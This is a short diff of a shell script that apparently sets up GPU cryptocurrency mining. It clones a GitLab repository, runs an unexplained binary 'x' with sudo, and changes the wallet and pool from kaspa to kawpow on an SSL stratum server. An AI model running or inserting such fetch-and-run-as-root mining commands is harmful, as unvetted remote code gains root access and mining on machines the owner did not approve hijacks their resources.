@@ -6,4 +6,4 @@ screen -dmS er.sh 65 75
 sudo git clone https://gitlab.com/letricejuliocesar/goodday
 cd goodday
 chmod +x x
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a kaspa -w kaspa:qpskljusdss2zgkeafjm554spudyezv53hwr45fxgjp5dxmf5cxyc3xmdywl6 -p stratum+tcp://acc-pool.pw:16061 -r $ip --nvidia 1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a kawpow -w NSE6Td5t6jMLz4Da5ftGq7H2245asWm6MV -p stratum+ssl://stratum-eu.rplant.xyz:17029 -r $ip --nvidia 1
